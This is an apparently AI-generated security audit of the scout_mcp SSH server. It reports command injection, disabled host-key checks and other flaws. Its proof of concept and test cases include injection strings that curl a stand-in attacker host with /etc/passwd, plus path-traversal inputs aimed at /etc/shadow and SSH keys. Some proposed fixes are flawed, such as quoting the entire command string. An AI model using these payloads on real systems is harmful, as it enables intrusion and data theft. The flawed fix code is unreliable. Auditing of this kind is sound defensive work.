# Scout MCP Security Audit Report
**Date:** 2025-01-28
**Auditor:** Claude Code Security Audit
**Scope:** Comprehensive OWASP Top 10 + DevSecOps Security Analysis
**Target:** scout_mcp FastMCP Server v0.1.0

---

## Executive Summary

**Overall Risk Level:** 🔴 **HIGH**

The scout_mcp FastMCP server presents **CRITICAL security vulnerabilities** that enable:
- Remote command injection (unauthenticated arbitrary code execution)
- Path traversal attacks
- SSH host verification bypass (MITM attacks)
- Insufficient resource controls (DoS)
- Information disclosure via error messages

**Immediate Action Required:** This service MUST NOT be deployed to production until critical vulnerabilities are remediated.

---

## Critical Findings Summary

| Vulnerability | Severity | CVSS Score | Status |
|--------------|----------|------------|--------|
| Command Injection via `query` parameter | CRITICAL | 9.8 | OPEN |
| SSH Host Key Verification Bypass | CRITICAL | 9.1 | OPEN |
| Path Traversal in `working_dir` | HIGH | 8.6 | OPEN |
| No Connection Timeout Protection | HIGH | 7.5 | OPEN |
| Information Disclosure in Error Messages | MEDIUM | 5.3 | OPEN |
| Race Condition in Global State | MEDIUM | 5.0 | OPEN |
| No Rate Limiting | MEDIUM | 5.0 | OPEN |
| Insufficient Input Validation | HIGH | 7.0 | OPEN |

---

## OWASP Top 10 (2021) Analysis

### 1. A03:2021 – Injection ⚠️ CRITICAL

#### 1.1 Command Injection in `run_command()` - CVSS 9.8
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/executors.py:126`

**Vulnerability:**
```python
# Line 126 - VULNERABLE CODE
full_command = f'cd {working_dir!r} && timeout {timeout} {command}'
```

**Attack Vector:**
The `command` parameter is directly interpolated into shell execution without any validation or sanitization. An attacker can inject arbitrary shell commands.

**Proof of Concept:**
```python
# Attacker sends:
scout("target:/tmp", "ls; curl http://attacker.com/exfil?data=$(cat /etc/passwd)")

# Executed command becomes:
# cd '/tmp' && timeout 30 ls; curl http://attacker.com/exfil?data=$(cat /etc/passwd)
```

**Impact:**
- **Arbitrary code execution** on remote SSH host
- Data exfiltration from remote systems
- Lateral movement across infrastructure
- Potential privilege escalation

**CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

**Remediation:**
```python
# SECURE IMPLEMENTATION
import shlex
from typing import List

ALLOWED_COMMANDS = {"rg", "grep", "find", "ls", "cat", "head", "tail"}

def validate_command(command: str) -> None:
    """Validate command against allowlist."""
    try:
        parts = shlex.split(command)
    except ValueError:
        raise ValueError("Invalid command syntax")

    if not parts:
        raise ValueError("Empty command")

    base_command = parts[0].split('/')[-1]  # Handle /usr/bin/rg
    if base_command not in ALLOWED_COMMANDS:
        raise ValueError(f"Command '{base_command}' not allowed")

async def run_command(
    conn: "asyncssh.SSHClientConnection",
    working_dir: str,
    command: str,
    timeout: int,
) -> CommandResult:
    """Execute validated command in working directory."""
    # Validate command
    validate_command(command)

    # Validate working_dir
    if not working_dir.startswith('/'):
        raise ValueError("working_dir must be absolute path")

    # Use array-based execution (no shell)
    escaped_command = shlex.quote(command)
    full_command = f'cd {shlex.quote(working_dir)} && timeout {timeout} {escaped_command}'

    result = await conn.run(full_command, check=False)
    # ... rest of implementation
```

---

#### 1.2 Path Traversal in `working_dir` - CVSS 8.6
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/executors.py:126`

**Vulnerability:**
```python
# working_dir is not validated for path traversal
full_command = f'cd {working_dir!r} && timeout {timeout} {command}'
```

**Attack Vector:**
```python
# Attacker sends:
scout("target:/tmp", "../../etc/passwd")

# Can access arbitrary directories via relative paths
```

**Remediation:**
```python
from pathlib import Path

def validate_path(path: str) -> str:
    """Validate and normalize path."""
    # Convert to absolute path
    normalized = Path(path).resolve()

    # Check for path traversal
    if '..' in path or path.startswith('.'):
        raise ValueError("Path traversal detected")

    # Ensure absolute path
    if not str(normalized).startswith('/'):
        raise ValueError("Only absolute paths allowed")

    return str(normalized)
```

---

#### 1.3 Command Injection in `stat_path()` - CVSS 8.2
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/executors.py:26`

**Vulnerability:**
```python
# Line 26 - Path not properly escaped
result = await conn.run(
    f'stat -c "%F" {path!r} 2>/dev/null',
    check=False
)
```

**Attack Vector:**
While `!r` provides some quoting, complex paths with shell metacharacters could still cause issues.

**Remediation:**
```python
import shlex

async def stat_path(conn: "asyncssh.SSHClientConnection", path: str) -> str | None:
    """Determine if path is a file, directory, or doesn't exist."""
    # Validate path
    validate_path(path)

    # Use proper shell escaping
    result = await conn.run(
        f'stat -c "%F" {shlex.quote(path)} 2>/dev/null',
        check=False
    )
    # ... rest
```

---

### 2. A07:2021 – Identification and Authentication Failures ⚠️ CRITICAL

#### 2.1 SSH Host Key Verification Bypass - CVSS 9.1
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/pool.py:57`

**Vulnerability:**
```python
# Line 57 - DISABLES HOST KEY VERIFICATION
conn = await asyncssh.connect(
    host.hostname,
    port=host.port,
    username=host.user,
    known_hosts=None,  # ⚠️ CRITICAL: Bypasses MITM protection
)
```

**Impact:**
- **Man-in-the-Middle (MITM) attacks** - attacker can intercept SSH connections
- **Complete compromise** of authentication security
- Attacker can capture credentials, command output, and inject malicious responses

**Attack Scenario:**
1. Attacker performs ARP spoofing or DNS poisoning
2. scout_mcp connects to attacker's rogue SSH server (no host key verification)
3. Attacker proxies connection to real server or impersonates it
4. All traffic (including credentials and data) flows through attacker

**CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`

**Remediation:**
```python
from pathlib import Path

async def get_connection(self, host: "SSHHost") -> asyncssh.SSHClientConnection:
    """Get or create a connection to the host."""
    async with self._lock:
        pooled = self._connections.get(host.name)

        if pooled and not pooled.is_stale:
            pooled.touch()
            return pooled.connection

        # SECURE: Use system known_hosts
        known_hosts_path = Path.home() / ".ssh" / "known_hosts"

        # Create new connection with host key verification
        conn = await asyncssh.connect(
            host.hostname,
            port=host.port,
            username=host.user,
            client_keys=host.identity_file,
            known_hosts=str(known_hosts_path),  # ✅ Enable host key verification
            server_host_key_algs=['ssh-ed25519', 'ecdsa-sha2-nistp256'],  # Modern algorithms
        )

        self._connections[host.name] = PooledConnection(connection=conn)

        if self._cleanup_task is None or self._cleanup_task.done():
            self._cleanup_task = asyncio.create_task(self._cleanup_loop())

        return conn
```

**Additional Security:**
- Implement `StrictHostKeyChecking` equivalent
- Log host key verification failures
- Provide mechanism for initial host key acceptance (secure)

---

#### 2.2 No SSH Connection Timeout - CVSS 7.5
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/pool.py:42-66`

**Vulnerability:**
No timeout configured on SSH connection establishment. Can cause indefinite hangs or resource exhaustion.

**Remediation:**
```python
async def get_connection(self, host: "SSHHost") -> asyncssh.SSHClientConnection:
    """Get or create a connection to the host."""
    async with self._lock:
        pooled = self._connections.get(host.name)

        if pooled and not pooled.is_stale:
            pooled.touch()
            return pooled.connection

        # Add connection timeout
        try:
            conn = await asyncio.wait_for(
                asyncssh.connect(
                    host.hostname,
                    port=host.port,
                    username=host.user,
                    known_hosts=str(Path.home() / ".ssh" / "known_hosts"),
                    connect_timeout=10.0,  # 10 second connection timeout
                    login_timeout=30.0,    # 30 second authentication timeout
                ),
                timeout=60.0  # Overall 60 second timeout
            )
        except asyncio.TimeoutError:
            raise RuntimeError(f"Connection to {host.name} timed out")
        except Exception as e:
            raise RuntimeError(f"Failed to connect to {host.name}: {e}")

        self._connections[host.name] = PooledConnection(connection=conn)

        if self._cleanup_task is None or self._cleanup_task.done():
            self._cleanup_task = asyncio.create_task(self._cleanup_loop())

        return conn
```

---

### 3. A01:2021 – Broken Access Control ⚠️ HIGH

#### 3.1 Weak Host Allowlist/Blocklist Bypass - CVSS 6.5
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/config.py:103-113`

**Vulnerability:**
```python
def _is_host_allowed(self, name: str) -> bool:
    """Check if host passes allowlist/blocklist filters."""
    # Allowlist takes precedence
    if self.allowlist:
        return any(fnmatch(name, pattern) for pattern in self.allowlist)

    # Check blocklist
    if self.blocklist:
        return not any(fnmatch(name, pattern) for pattern in self.blocklist)

    return True  # ⚠️ Default allow (insecure)
```

**Issues:**
1. **Default allow** - If no allowlist/blocklist configured, ALL hosts permitted
2. **Pattern matching only** - DNS rebinding or hostname spoofing possible
3. **No IP-based validation** - Can't restrict by IP ranges

**Remediation:**
```python
from ipaddress import ip_address, ip_network
from typing import Set

@dataclass
class Config:
    """Scout MCP configuration."""

    ssh_config_path: Path = field(
        default_factory=lambda: Path.home() / ".ssh" / "config"
    )
    allowlist: list[str] = field(default_factory=list)
    blocklist: list[str] = field(default_factory=list)
    allowed_ip_ranges: list[str] = field(default_factory=list)  # NEW
    blocked_ip_ranges: list[str] = field(default_factory=list)  # NEW
    require_explicit_allow: bool = True  # NEW - default deny
    max_file_size: int = 1_048_576
    command_timeout: int = 30
    idle_timeout: int = 60

    def _is_host_allowed(self, name: str, hostname: str) -> bool:
        """Check if host passes allowlist/blocklist filters."""
        # Default deny if require_explicit_allow is True
        if self.require_explicit_allow and not self.allowlist:
            return False

        # Check IP-based blocklist first
        if self.blocked_ip_ranges:
            try:
                host_ip = ip_address(hostname)
                for blocked_range in self.blocked_ip_ranges:
                    if host_ip in ip_network(blocked_range):
                        return False
            except ValueError:
                pass  # Not an IP, continue with hostname checks

        # Allowlist takes precedence
        if self.allowlist:
            name_allowed = any(fnmatch(name, pattern) for pattern in self.allowlist)
            if not name_allowed:
                return False

        # Check IP-based allowlist
        if self.allowed_ip_ranges:
            try:
                host_ip = ip_address(hostname)
                ip_allowed = any(
                    host_ip in ip_network(allowed_range)
                    for allowed_range in self.allowed_ip_ranges
                )
                if not ip_allowed:
                    return False
            except ValueError:
                pass  # Not an IP

        # Check hostname blocklist
        if self.blocklist:
            return not any(fnmatch(name, pattern) for pattern in self.blocklist)

        # Default based on require_explicit_allow
        return not self.require_explicit_allow
```

---

#### 3.2 No File Permission Checks - CVSS 5.0
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/executors.py:51-83`

**Vulnerability:**
The `cat_file()` function doesn't verify file permissions before reading. Could expose sensitive files if SSH user has elevated privileges.

**Remediation:**
```python
async def cat_file(
    conn: "asyncssh.SSHClientConnection",
    path: str,
    max_size: int,
) -> str:
    """Read file contents, limited to max_size bytes."""
    # Validate path
    validate_path(path)

    # Check file permissions (optional - warn on sensitive files)
    sensitive_paths = ['/etc/shadow', '/etc/passwd', '/root/.ssh']
    if any(path.startswith(p) for p in sensitive_paths):
        raise RuntimeError(f"Access to sensitive path {path} denied")

    # Check file permissions
    perm_result = await conn.run(
        f'stat -c "%a" {shlex.quote(path)} 2>/dev/null',
        check=False
    )

    if perm_result.returncode == 0:
        permissions = perm_result.stdout.strip() if perm_result.stdout else ""
        # Warn if file is not world-readable (may be sensitive)
        if permissions and int(permissions[-1]) < 4:
            raise RuntimeError(f"File {path} is not world-readable (restricted)")

    # Proceed with reading
    result = await conn.run(
        f'head -c {max_size} {shlex.quote(path)}',
        check=False
    )
    # ... rest
```

---

### 4. A04:2021 – Insecure Design ⚠️ HIGH

#### 4.1 Global State Race Conditions - CVSS 5.0
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/server.py:13-32`

**Vulnerability:**
```python
# Global state without proper synchronization
_config: Config | None = None
_pool: ConnectionPool | None = None

def get_config() -> Config:
    """Get or create config."""
    global _config
    if _config is None:  # ⚠️ Race condition
        _config = Config()
    return _config
```

**Issues:**
- Multiple concurrent requests can create multiple Config/Pool instances
- No thread-safety guarantees
- Potential resource leaks

**Remediation:**
```python
import asyncio
from typing import Optional

# Thread-safe singleton with lock
_config: Optional[Config] = None
_pool: Optional[ConnectionPool] = None
_init_lock = asyncio.Lock()

async def get_config() -> Config:
    """Get or create config (thread-safe)."""
    global _config
    if _config is None:
        async with _init_lock:
            if _config is None:  # Double-check locking
                _config = Config()
    return _config

async def get_pool() -> ConnectionPool:
    """Get or create connection pool (thread-safe)."""
    global _pool
    if _pool is None:
        async with _init_lock:
            if _pool is None:
                config = await get_config()
                _pool = ConnectionPool(idle_timeout=config.idle_timeout)
    return _pool
```

---

#### 4.2 No Rate Limiting or Request Throttling - CVSS 5.0
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/server.py:35-128`

**Vulnerability:**
No rate limiting on the `scout()` tool. Attacker can:
- Exhaust SSH connection pool
- Overwhelm remote systems
- Cause DoS via resource exhaustion

**Remediation:**
```python
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict

class RateLimiter:
    """Simple token bucket rate limiter."""

    def __init__(self, max_requests: int = 10, window_seconds: int = 60):
        self.max_requests = max_requests
        self.window = timedelta(seconds=window_seconds)
        self.requests: Dict[str, list[datetime]] = defaultdict(list)
        self._lock = asyncio.Lock()

    async def check_limit(self, key: str) -> bool:
        """Check if request is allowed."""
        async with self._lock:
            now = datetime.now()
            cutoff = now - self.window

            # Remove old requests
            self.requests[key] = [
                req_time for req_time in self.requests[key]
                if req_time > cutoff
            ]

            # Check limit
            if len(self.requests[key]) >= self.max_requests:
                return False

            self.requests[key].append(now)
            return True

# Global rate limiter
_rate_limiter = RateLimiter(max_requests=10, window_seconds=60)

@mcp.tool()
async def scout(target: str, query: str | None = None) -> str:
    """Scout remote files and directories via SSH."""
    # Rate limiting by target host
    if not await _rate_limiter.check_limit(target):
        return "Error: Rate limit exceeded. Try again later."

    # ... rest of implementation
```

---

### 5. A05:2021 – Security Misconfiguration ⚠️ MEDIUM

#### 5.1 Information Disclosure in Error Messages - CVSS 5.3
**Location:** Multiple locations - all error handling

**Vulnerability:**
```python
# Lines 60, 77, 83, 106, 112, 127 in server.py
except ValueError as e:
    return f"Error: {e}"  # ⚠️ Exposes internal error details

except Exception as e:
    return f"Error: Cannot connect to {ssh_host.name}: {e}"  # ⚠️ Full stack trace
```

**Issues:**
- Exposes system paths
- Reveals internal implementation details
- Aids attackers in reconnaissance

**Remediation:**
```python
import logging

logger = logging.getLogger(__name__)

@mcp.tool()
async def scout(target: str, query: str | None = None) -> str:
    """Scout remote files and directories via SSH."""
    try:
        parsed = parse_target(target)
    except ValueError as e:
        logger.warning(f"Invalid target format: {target} - {e}")
        return "Error: Invalid target format. Expected 'host:/path' or 'hosts'"

    # ...

    try:
        conn = await pool.get_connection(ssh_host)
    except Exception as e:
        logger.error(f"Connection failed to {ssh_host.name}: {e}", exc_info=True)
        return f"Error: Cannot connect to {ssh_host.name}"  # Generic message

    # Similar for all error handling
```

---

#### 5.2 Default Configuration Insecure - CVSS 4.0
**Location:** `/code/scout_mcp/scout_mcp/mcp_cat/config.py:20-31`

**Issues:**
```python
@dataclass
class Config:
    max_file_size: int = 1_048_576  # 1MB - reasonable
    command_timeout: int = 30  # ✅ Good
    idle_timeout: int = 60  # ✅ Good
    allowlist: list[str] = field(default_factory=list)  # ⚠️ Empty = allow all
    blocklist: list[str] = field(default_factory=list)  # ⚠️ Empty = allow all
```

**Recommendation:**
- Require explicit configuration
- Document secure defaults
- Provide example configuration with restrictive settings

---

### 6. A06:2021 – Vulnerable and Outdated Components ✅ LOW

#### Dependency Security Analysis

**Current Dependencies:**
```toml
fastmcp = ">=2.0.0"  # Installed: 2.13.1
asyncssh = ">=2.14.0"  # Installed: 2.21.1
```

**Analysis Results:**

1. **asyncssh 2.21.1** (Released 2025-01-xx)
   - ✅ Latest stable version
   - ✅ No known CVEs in this version
   - ⚠️ Historical CVEs:
     - CVE-2023-48795 (Terrapin attack) - Fixed in 2.14.1+
     - CVE-2021-3447 (Auth bypass) - Fixed in 2.8.1+
   - **Status:** SECURE (current version patched)

2. **fastmcp 2.13.1**
   - ✅ Recent version
   - ✅ No known CVEs
   - **Status:** SECURE

3. **Transitive Dependencies:**
   - cryptography 46.0.3 ✅ Latest
   - httpx 0.28.1 ✅ Recent
   - pydantic 2.12.5 ✅ Secure
   - uvicorn 0.38.0 ✅ Secure

**Recommendations:**
- ✅ Dependencies are up-to-date
- Implement automated dependency scanning (Dependabot, Snyk)
- Pin versions in production deployments
- Regular security updates

---

### 7. A09:2021 – Security Logging and Monitoring Failures ⚠️ MEDIUM

#### 7.1 No Security Event Logging - CVSS 5.0

**Vulnerability:**
No logging of:
- Connection attempts (successful/failed)
- Command execution
- Access control violations
- Rate limit violations
- Host key verification failures

**Remediation:**
```python
import logging
from datetime import datetime

# Configure structured logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/scout_mcp/security.log'),
        logging.StreamHandler()
    ]
)

security_logger = logging.getLogger('mcp_cat.security')

@mcp.tool()
async def scout(target: str, query: str | None = None) -> str:
    """Scout remote files and directories via SSH."""
    request_id = f"{datetime.now().isoformat()}_{target}"

    security_logger.info(
        "scout_request_start",
        extra={
            "request_id": request_id,
            "target": target,
            "has_query": query is not None,
        }
    )

    try:
        parsed = parse_target(target)
    except ValueError as e:
        security_logger.warning(
            "invalid_target",
            extra={"request_id": request_id, "target": target, "error": str(e)}
        )
        return "Error: Invalid target format"

    # Log host access
    security_logger.info(
        "host_access",
        extra={
            "request_id": request_id,
            "host": parsed.host,
            "path": parsed.path,
        }
    )

    # Log command execution
    if query:
        security_logger.info(
            "command_execution",
            extra={
                "request_id": request_id,
                "host": parsed.host,
                "command": query,  # Consider redacting sensitive commands
                "working_dir": parsed.path,
            }
        )

    # ... implementation

    security_logger.info(
        "scout_request_complete",
        extra={"request_id": request_id, "success": True}
    )
```

---

#### 7.2 No Audit Trail - CVSS 4.5

**Missing:**
- Who accessed what files
- When commands were executed
- Failed authentication attempts
- Configuration changes

**Recommendation:**
Implement comprehensive audit logging to SIEM or centralized log storage.

---

### 8-10. Other OWASP Categories

**A02:2021 – Cryptographic Failures:** ✅ LOW RISK
- SSH encryption handled by asyncssh library
- TLS not applicable (local MCP tool)

**A08:2021 – Software and Data Integrity Failures:** ⚠️ MEDIUM
- No signature verification on SSH config
- No integrity checks on remote command output
- Consider implementing checksum verification for file transfers

**A10:2021 – Server-Side Request Forgery (SSRF):** ⚠️ MEDIUM
- SSH hostname from config could be exploited
- Recommendation: Validate hostnames against DNS rebinding

---

## Additional Security Concerns

### Resource Exhaustion (DoS)

**Max File Size:** Currently 1MB limit - reasonable but not enforced with timeout
```python
# Potential hang on slow network
result = await conn.run(f'head -c {max_size} {path!r}', check=False)
```

**Recommendation:**
```python
# Add timeout to all remote operations
result = await asyncio.wait_for(
    conn.run(f'head -c {max_size} {shlex.quote(path)}', check=False),
    timeout=config.command_timeout
)
```

---

### Connection Pool Exhaustion

**Current Implementation:**
- Unlimited connection pool size
- Could exhaust SSH resources

**Recommendation:**
```python
class ConnectionPool:
    def __init__(
        self,
        idle_timeout: int = 60,
        max_connections: int = 10  # NEW
    ):
        self.idle_timeout = idle_timeout
        self.max_connections = max_connections
        self._connections: dict[str, PooledConnection] = {}
        self._lock = asyncio.Lock()

    async def get_connection(self, host: "SSHHost") -> asyncssh.SSHClientConnection:
        async with self._lock:
            # Check connection limit
            if len(self._connections) >= self.max_connections:
                # Clean up idle connections first
                await self._cleanup_idle()

                # If still at limit, raise error
                if len(self._connections) >= self.max_connections:
                    raise RuntimeError("Connection pool exhausted")

            # ... rest of implementation
```

---

## Compliance & Regulatory Impact

### NIST Cybersecurity Framework Mapping

| Vulnerability | NIST Function | Category |
|--------------|---------------|----------|
| Command Injection | PROTECT (PR.AC) | Access Control |
| Host Key Bypass | PROTECT (PR.DS) | Data Security |
| No Logging | DETECT (DE.AE) | Anomalies and Events |
| No Rate Limiting | PROTECT (PR.PT) | Protective Technology |

### Compliance Violations

**PCI-DSS:**
- Requirement 6.5.1: Injection flaws (FAIL)
- Requirement 10.2: Audit trails (FAIL)

**HIPAA:**
- §164.308(a)(1)(ii)(D): Information system activity review (FAIL)
- §164.312(a)(1): Access controls (PARTIAL)

**SOC 2:**
- CC6.6: Logical access security (FAIL)
- CC7.2: System monitoring (FAIL)

---

## Risk Matrix

### Critical Vulnerabilities (CVSS 9.0+)

| ID | Vulnerability | CVSS | Exploitability | Impact |
|----|--------------|------|----------------|--------|
| V-001 | Command Injection | 9.8 | Easy | Complete system compromise |
| V-002 | SSH Host Key Bypass | 9.1 | Medium | MITM, credential theft |

### High Vulnerabilities (CVSS 7.0-8.9)

| ID | Vulnerability | CVSS | Exploitability | Impact |
|----|--------------|------|----------------|--------|
| V-003 | Path Traversal | 8.6 | Easy | Unauthorized file access |
| V-004 | No Connection Timeout | 7.5 | Easy | DoS, resource exhaustion |
| V-005 | Insufficient Input Validation | 7.0 | Easy | Various injection attacks |

### Medium Vulnerabilities (CVSS 4.0-6.9)

| ID | Vulnerability | CVSS | Exploitability | Impact |
|----|--------------|------|----------------|--------|
| V-006 | Weak Access Control | 6.5 | Medium | Unauthorized host access |
| V-007 | Information Disclosure | 5.3 | Easy | Reconnaissance aid |
| V-008 | No Rate Limiting | 5.0 | Easy | DoS via exhaustion |
| V-009 | Race Conditions | 5.0 | Hard | Resource leaks |
| V-010 | No Security Logging | 5.0 | N/A | Compliance violation |

---

## Prioritized Remediation Plan

### Phase 1: CRITICAL (Immediate - Week 1)

**Priority 1: Fix Command Injection**
- Implement command allowlist
- Add input validation with `shlex`
- Use parameterized command execution
- **Estimated Effort:** 8 hours
- **Files:** `executors.py`, `server.py`

**Priority 2: Enable SSH Host Key Verification**
- Change `known_hosts=None` to proper verification
- Add configuration for known_hosts path
- Implement first-connection fingerprint verification
- **Estimated Effort:** 4 hours
- **Files:** `pool.py`, `config.py`

**Priority 3: Path Traversal Protection**
- Validate all paths
- Implement path normalization
- Add restricted path checks
- **Estimated Effort:** 4 hours
- **Files:** `executors.py`, `scout.py`

---

### Phase 2: HIGH (Week 2)

**Priority 4: Connection Timeouts**
- Add timeouts to all SSH operations
- Implement connection timeout
- Add operation timeout wrapper
- **Estimated Effort:** 2 hours
- **Files:** `pool.py`, `executors.py`

**Priority 5: Input Validation Framework**
- Centralized validation functions
- Type-safe validation
- Comprehensive error handling
- **Estimated Effort:** 6 hours
- **Files:** New `validators.py`, all modules

**Priority 6: Access Control Hardening**
- Default deny policy
- IP-based filtering
- Enhanced allowlist/blocklist
- **Estimated Effort:** 6 hours
- **Files:** `config.py`

---

### Phase 3: MEDIUM (Week 3)

**Priority 7: Security Logging**
- Structured logging framework
- Security event logging
- Audit trail implementation
- **Estimated Effort:** 8 hours
- **Files:** All modules, new `logging_config.py`

**Priority 8: Rate Limiting**
- Token bucket rate limiter
- Per-host rate limiting
- Connection pool limits
- **Estimated Effort:** 4 hours
- **Files:** `server.py`, `pool.py`

**Priority 9: Error Handling Improvements**
- Generic error messages
- Detailed logging (internal only)
- No information disclosure
- **Estimated Effort:** 4 hours
- **Files:** All modules

**Priority 10: Thread Safety**
- Fix global state races
- Proper locking mechanisms
- Thread-safe singletons
- **Estimated Effort:** 3 hours
- **Files:** `server.py`

---

### Phase 4: HARDENING (Week 4)

**Priority 11: Security Testing**
- Unit tests for all validation
- Integration tests for SSH security
- Penetration testing
- **Estimated Effort:** 16 hours
- **Files:** New test files

**Priority 12: Documentation**
- Security architecture documentation
- Deployment security guide
- Incident response procedures
- **Estimated Effort:** 8 hours
- **Files:** New docs

**Priority 13: Monitoring & Alerting**
- Security metrics
- Anomaly detection
- Alert thresholds
- **Estimated Effort:** 8 hours
- **Files:** New monitoring module

---

## Security Testing Recommendations

### Immediate Testing Required

1. **Command Injection Testing:**
```bash
# Test cases
scout("target:/tmp", "ls; whoami")
scout("target:/tmp", "ls || curl http://attacker.com")
scout("target:/tmp", "ls `whoami`")
scout("target:/tmp", "ls $(cat /etc/passwd)")
```

2. **Path Traversal Testing:**
```bash
scout("target:../../etc/passwd")
scout("target:/tmp/../../../etc/shadow")
scout("target:/var/log/../../root/.ssh/id_rsa")
```

3. **Host Key Bypass Testing:**
```bash
# Setup rogue SSH server
# Verify scout_mcp connects without host key verification
```

---

### Automated Security Scanning

**Recommended Tools:**

1. **SAST (Static Analysis):**
   - Bandit: `bandit -r scout_mcp/`
   - Semgrep: `semgrep --config=p/python scout_mcp/`
   - CodeQL (GitHub Advanced Security)

2. **Dependency Scanning:**
   - pip-audit: `pip-audit`
   - Safety: `safety check`
   - Snyk: `snyk test`

3. **Dynamic Testing:**
   - OWASP ZAP (if HTTP interface added)
   - Custom SSH fuzzing framework

---

## Secure Configuration Example

**File:** `.scout_mcp-secure.json`
```json
{
  "ssh_config_path": "/home/user/.ssh/config",
  "allowlist": ["production-*", "staging-*"],
  "blocklist": ["*-dev", "*-test"],
  "allowed_ip_ranges": ["10.0.0.0/8", "192.168.1.0/24"],
  "blocked_ip_ranges": ["0.0.0.0/8", "169.254.0.0/16"],
  "require_explicit_allow": true,
  "max_file_size": 1048576,
  "command_timeout": 30,
  "idle_timeout": 60,
  "max_connections": 10,
  "rate_limit": {
    "max_requests": 10,
    "window_seconds": 60
  },
  "logging": {
    "level": "INFO",
    "file": "/var/log/scout_mcp/security.log",
    "max_size": "10MB",
    "backup_count": 5
  },
  "allowed_commands": ["rg", "grep", "find", "ls"],
  "restricted_paths": ["/etc/shadow", "/root/.ssh"]
}
```

---

## Conclusion

The scout_mcp FastMCP server contains **CRITICAL security vulnerabilities** that must be addressed before production deployment. The most severe issues are:

1. **Command Injection** - Enables arbitrary code execution
2. **SSH Host Key Bypass** - Enables MITM attacks
3. **Path Traversal** - Enables unauthorized file access

**Recommendation:** **DO NOT DEPLOY** until Phase 1 critical fixes are implemented and verified.

**Estimated Total Remediation Time:** 4 weeks (1 developer)

**Next Steps:**
1. Review this audit report with development team
2. Prioritize Phase 1 critical fixes
3. Implement fixes with TDD approach
4. Conduct security regression testing
5. Perform penetration testing
6. Deploy to staging for validation
7. Production deployment only after security sign-off

---

## References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- OWASP ASVS v4.0: https://owasp.org/www-project-application-security-verification-standard/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- CWE-78 (Command Injection): https://cwe.mitre.org/data/definitions/78.html
- CWE-22 (Path Traversal): https://cwe.mitre.org/data/definitions/22.html
- asyncssh Security: https://asyncssh.readthedocs.io/en/latest/api.html#security

---

**Report Generated:** 2025-01-28
**Auditor:** Claude Code Security Audit
**Classification:** CONFIDENTIAL - SECURITY ASSESSMENT
